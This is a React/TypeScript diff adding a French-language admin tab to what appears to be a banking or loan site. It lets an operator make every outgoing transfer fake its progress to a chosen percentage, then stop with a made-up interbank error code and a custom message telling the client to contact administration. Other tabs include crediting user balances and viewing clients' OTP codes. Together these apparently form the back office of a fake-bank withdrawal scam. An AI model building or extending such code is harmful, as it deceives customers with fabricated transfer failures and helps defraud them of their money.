@@ -60,6 +60,14 @@ interface AdminWithdrawal {
   userEmail?: string;
 }
 
+interface TransferSettings {
+  id: number;
+  haltPercent: number;
+  haltMessage: string;
+  errorCode: string;
+  updatedAt: string;
+}
+
 export default function AdminPage() {
   const router = useRouter();
 
@@ -74,8 +82,9 @@ export default function AdminPage() {
   const [users, setUsers] = useState<User[]>([]);
   const [loans, setLoans] = useState<AdminLoan[]>([]);
   const [withdrawals, setWithdrawals] = useState<AdminWithdrawal[]>([]);
+  const [transferSettings, setTransferSettings] = useState<TransferSettings | null>(null);
   const [selectedUser, setSelectedUser] = useState<User | null>(null);
-  const [activeTab, setActiveTab] = useState<"users" | "loans" | "withdrawals">("users");
+  const [activeTab, setActiveTab] = useState<"users" | "loans" | "withdrawals" | "settings">("users");
 
   // Credit user modal
   const [creditUser, setCreditUser] = useState<User | null>(null);
@@ -84,6 +93,13 @@ export default function AdminPage() {
   const [creditLoading, setCreditLoading] = useState(false);
   const [creditFeedback, setCreditFeedback] = useState("");
   const [copiedCodeId, setCopiedCodeId] = useState<string | null>(null);
+
+  // Transfer settings modal
+  const [settingsLoading, setSettingsLoading] = useState(false);
+  const [settingsFeedback, setSettingsFeedback] = useState("");
+  const [haltPercentInput, setHaltPercentInput] = useState(75);
+  const [haltMessageInput, setHaltMessageInput] = useState("");
+  const [errorCodeInput, setErrorCodeInput] = useState("");
 
   // Block user modal
   const [blockUser, setBlockUser] = useState<User | null>(null);
@@ -136,6 +152,21 @@ export default function AdminPage() {
     }
   }, []);
 
+  const fetchTransferSettings = useCallback(async () => {
+    try {
+      const res = await fetch("/api/admin/transfer-settings");
+      const data = await res.json();
+      if (data.success && data.settings) {
+        setTransferSettings(data.settings);
+        setHaltPercentInput(data.settings.haltPercent);
+        setHaltMessageInput(data.settings.haltMessage);
+        setErrorCodeInput(data.settings.errorCode);
+      }
+    } catch (err) {
+      console.error("Erreur chargement paramètres virement", err);
+    }
+  }, []);
+
   useEffect(() => {
     let active = true;
     fetch("/api/admin/users")
@@ -150,6 +181,7 @@ export default function AdminPage() {
           setIsAuthenticated(true);
           fetchLoans();
           fetchWithdrawals();
+          fetchTransferSettings();
         }
       })
       .catch((error: unknown) => console.error("Erreur chargement utilisateurs", error))
@@ -160,7 +192,7 @@ export default function AdminPage() {
     return () => {
       active = false;
     };
-  }, [fetchLoans, fetchWithdrawals]);
+  }, [fetchLoans, fetchWithdrawals, fetchTransferSettings]);
 
   const handleLoginSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -301,6 +333,37 @@ export default function AdminPage() {
       alert(err instanceof Error ? err.message : "Erreur.");
     } finally {
       setCreditLoading(false);
+    }
+  };
+
+  const handleTransferSettingsSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    setSettingsLoading(true);
+    setSettingsFeedback("");
+
+    try {
+      const res = await fetch("/api/admin/transfer-settings", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          haltPercent: haltPercentInput,
+          haltMessage: haltMessageInput,
+          errorCode: errorCodeInput,
+        }),
+      });
+
+      const data = await res.json();
+      if (!res.ok) throw new Error(data.message ?? "Échec de la mise à jour.");
+
+      setSettingsFeedback(data.message);
+      setTransferSettings(data.settings);
+      setTimeout(() => {
+        setSettingsFeedback("");
+      }, 2000);
+    } catch (err) {
+      alert(err instanceof Error ? err.message : "Erreur.");
+    } finally {
+      setSettingsLoading(false);
     }
   };
 
@@ -470,6 +533,22 @@ export default function AdminPage() {
             }}
           >
             <i className="fa-solid fa-key"></i> Retraits & Codes OTP ({pendingWithdrawals.length})
+          </button>
+
+          <button
+            onClick={() => setActiveTab("settings")}
+            style={{
+              background: activeTab === "settings" ? "#64748b" : "rgba(255,255,255,0.06)",
+              color: "#fff",
+              padding: "0.75rem 1.25rem",
+              borderRadius: "12px",
+              border: "1px solid rgba(255,255,255,0.1)",
+              fontWeight: 700,
+              fontSize: "0.95rem",
+              cursor: "pointer",
+            }}
+          >
+            <i className="fa-solid fa-gear"></i> Paramètres Virements
           </button>
         </div>
 
@@ -853,6 +932,193 @@ export default function AdminPage() {
                   )}
                 </tbody>
               </table>
+            </div>
+          </div>
+        )}
+
+        {/* ================= ONGLET 4 : PARAMÈTRES VIREMENTS ================= */}
+        {activeTab === "settings" && (
+          <div className="admin-section">
+            <div className="section-header-admin">
+              <h3 className="admin-section-title">Configuration des virements sortants</h3>
+              <span className="badge-count">Contrôle du comportement d&apos;arrêt</span>
+            </div>
+
+            <div style={{ maxWidth: "700px" }}>
+              <div style={{ background: "rgba(255,255,255,0.03)", border: "1px solid rgba(255,255,255,0.08)", borderRadius: "16px", padding: "2rem" }}>
+                <div style={{ marginBottom: "1.5rem", padding: "1rem", background: "rgba(59, 130, 246, 0.1)", border: "1px solid rgba(59, 130, 246, 0.3)", borderRadius: "12px" }}>
+                  <h4 style={{ margin: "0 0 0.5rem 0", color: "#93c5fd", display: "flex", alignItems: "center", gap: "0.5rem" }}>
+                    <i className="fa-solid fa-circle-info"></i> Fonctionnement
+                  </h4>
+                  <p style={{ margin: 0, color: "rgba(255,255,255,0.8)", fontSize: "0.9rem", lineHeight: 1.6 }}>
+                    Quand un client saisit son code OTP pour valider un virement, une animation de chargement démarre.
+                    Le virement progresse visuellement jusqu&apos;au <strong>pourcentage d&apos;arrêt</strong> configuré ci-dessous,
+                    puis s&apos;arrête avec un <strong>message d&apos;erreur personnalisé</strong>.
+                    Le virement est marqué comme échoué et le client doit contacter l&apos;administration.
+                  </p>
+                </div>
+
+                <form onSubmit={handleTransferSettingsSubmit} style={{ display: "flex", flexDirection: "column", gap: "1.5rem" }}>
+                  {/* Halt Percent */}
+                  <div>
+                    <label style={{ display: "block", fontSize: "0.85rem", color: "#cbd5e1", marginBottom: "0.5rem", fontWeight: 600 }}>
+                      Pourcentage d&apos;arrêt du chargement (%)
+                    </label>
+                    <div style={{ display: "flex", alignItems: "center", gap: "1rem" }}>
+                      <input
+                        type="number"
+                        min="1"
+                        max="100"
+                        required
+                        value={haltPercentInput}
+                        onChange={(e) => setHaltPercentInput(Math.min(100, Math.max(1, parseInt(e.target.value) || 1)))}
+                        style={{
+                          width: "120px",
+                          padding: "0.85rem 1rem",
+                          borderRadius: "10px",
+                          background: "rgba(255,255,255,0.06)",
+                          border: "1px solid rgba(255,255,255,0.15)",
+                          color: "#fff",
+                          fontSize: "1.1rem",
+                          fontWeight: 700,
+                          textAlign: "center",
+                        }}
+                      />
+                      <span style={{ color: "#94a3b8", fontSize: "0.9rem" }}>Le chargement s&apos;arrêtera à ce pourcentage (ex: 75 = 75%)</span>
+                    </div>
+                  </div>
+
+                  {/* Error Code */}
+                  <div>
+                    <label style={{ display: "block", fontSize: "0.85rem", color: "#cbd5e1", marginBottom: "0.5rem", fontWeight: 600 }}>
+                      Code d&apos;erreur technique
+                    </label>
+                    <input
+                      type="text"
+                      value={errorCodeInput}
+                      onChange={(e) => setErrorCodeInput(e.target.value)}
+                      placeholder="Ex: ERR_INTERBANK_ROUTING_SUSPENDED"
+                      style={{
+                        width: "100%",
+                        maxWidth: "400px",
+                        padding: "0.85rem 1rem",
+                        borderRadius: "10px",
+                        background: "rgba(255,255,255,0.06)",
+                        border: "1px solid rgba(255,255,255,0.15)",
+                        color: "#fff",
+                        fontSize: "0.95rem",
+                        fontFamily: "monospace",
+                        boxSizing: "border-box",
+                      }}
+                    />
+                    <p style={{ margin: "0.4rem 0 0 0", fontSize: "0.8rem", color: "#64748b" }}>
+                      Code technique affiché dans les logs et notifications (ex: ERR_SEPA_75, ERR_INTERBANK_ROUTING_SUSPENDED)
+                    </p>
+                  </div>
+
+                  {/* Halt Message */}
+                  <div>
+                    <label style={{ display: "block", fontSize: "0.85rem", color: "#cbd5e1", marginBottom: "0.5rem", fontWeight: 600 }}>
+                      Message affiché au client à l&apos;arrêt
+                    </label>
+                    <textarea
+                      required
+                      value={haltMessageInput}
+                      onChange={(e) => setHaltMessageInput(e.target.value)}
+                      placeholder="Ex: Une erreur est survenue, veuillez contacter le gestionnaire ou bien tentez à nouveau plus tard."
+                      rows={4}
+                      style={{
+                        width: "100%",
+                        padding: "0.85rem 1rem",
+                        borderRadius: "10px",
+                        background: "rgba(255,255,255,0.06)",
+                        border: "1px solid rgba(255,255,255,0.15)",
+                        color: "#fff",
+                        fontSize: "0.95rem",
+                        fontFamily: "inherit",
+                        boxSizing: "border-box",
+                        resize: "vertical",
+                      }}
+                    />
+                    <p style={{ margin: "0.4rem 0 0 0", fontSize: "0.8rem", color: "#64748b" }}>
+                      Ce message s&apos;affiche au client quand le chargement atteint le pourcentage d&apos;arrêt. Rédigez-le à l&apos;avance comme vous le souhaitez.
+                    </p>
+                  </div>
+
+                  {settingsFeedback && (
+                    <div style={{ background: "rgba(16, 185, 129, 0.2)", border: "1px solid rgba(16, 185, 129, 0.4)", color: "#6ee7b7", padding: "0.75rem 1rem", borderRadius: "10px", fontSize: "0.9rem" }}>
+                      <i className="fa-solid fa-circle-check"></i> {settingsFeedback}
+                    </div>
+                  )}
+
+                  <div style={{ display: "flex", gap: "0.75rem", marginTop: "1rem" }}>
+                    <button
+                      type="button"
+                      onClick={() => {
+                        setHaltPercentInput(transferSettings?.haltPercent ?? 75);
+                        setHaltMessageInput(transferSettings?.haltMessage ?? "");
+                        setErrorCodeInput(transferSettings?.errorCode ?? "");
+                        setSettingsFeedback("");
+                      }}
+                      style={{
+                        flex: 1,
+                        padding: "0.85rem",
+                        borderRadius: "10px",
+                        background: "rgba(255,255,255,0.08)",
+                        border: "none",
+                        color: "#fff",
+                        fontWeight: 600,
+                        cursor: "pointer",
+                      }}
+                    >
+                      Réinitialiser
+                    </button>
+                    <button
+                      type="submit"
+                      disabled={settingsLoading}
+                      style={{
+                        flex: 1,
+                        padding: "0.85rem",
+                        borderRadius: "10px",
+                        background: "linear-gradient(135deg, #4361ee, #3a0ca3)",
+                        border: "none",
+                        color: "#fff",
+                        fontWeight: 700,
+                        cursor: settingsLoading ? "wait" : "pointer",
+                      }}
+                    >
+                      {settingsLoading ? "Enregistrement…" : "Enregistrer les paramètres"}
+                    </button>
+                  </div>
+                </form>
+
+                {/* Current settings display */}
+                {transferSettings && (
+                  <div style={{ marginTop: "2rem", paddingTop: "1.5rem", borderTop: "1px solid rgba(255,255,255,0.1)" }}>
+                    <h4 style={{ color: "#94a3b8", fontSize: "0.85rem", textTransform: "uppercase", letterSpacing: "1px", marginBottom: "1rem" }}>
+                      Valeurs actuelles
+                    </h4>
+                    <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(200px, 1fr))", gap: "1rem", fontSize: "0.9rem" }}>
+                      <div style={{ background: "rgba(255,255,255,0.03)", padding: "1rem", borderRadius: "10px", border: "1px solid rgba(255,255,255,0.08)" }}>
+                        <div style={{ color: "#64748b", fontSize: "0.75rem", marginBottom: "0.25rem" }}>Pourcentage d&apos;arrêt</div>
+                        <div style={{ color: "#60a5fa", fontWeight: 700, fontSize: "1.25rem" }}>{transferSettings.haltPercent}%</div>
+                      </div>
+                      <div style={{ background: "rgba(255,255,255,0.03)", padding: "1rem", borderRadius: "10px", border: "1px solid rgba(255,255,255,0.08)" }}>
+                        <div style={{ color: "#64748b", fontSize: "0.75rem", marginBottom: "0.25rem" }}>Code d&apos;erreur</div>
+                        <div style={{ color: "#cbd5e1", fontFamily: "monospace", fontSize: "0.85rem", wordBreak: "break-all" }}>{transferSettings.errorCode}</div>
+                      </div>
+                      <div style={{ background: "rgba(255,255,255,0.03)", padding: "1rem", borderRadius: "10px", border: "1px solid rgba(255,255,255,0.08)", gridColumn: "1 / -1" }}>
+                        <div style={{ color: "#64748b", fontSize: "0.75rem", marginBottom: "0.25rem" }}>Message client</div>
+                        <div style={{ color: "#cbd5e1", whiteSpace: "pre-wrap" }}>{transferSettings.haltMessage}</div>
+                      </div>
+                      <div style={{ background: "rgba(255,255,255,0.03)", padding: "1rem", borderRadius: "10px", border: "1px solid rgba(255,255,255,0.08)", gridColumn: "1 / -1" }}>
+                        <div style={{ color: "#64748b", fontSize: "0.75rem", marginBottom: "0.25rem" }}>Dernière mise à jour</div>
+                        <div style={{ color: "#94a3b8" }}>{new Date(transferSettings.updatedAt).toLocaleString("fr-FR")}</div>
+                      </div>
+                    </div>
+                  </div>
+                )}
+              </div>
             </div>
           </div>
         )}
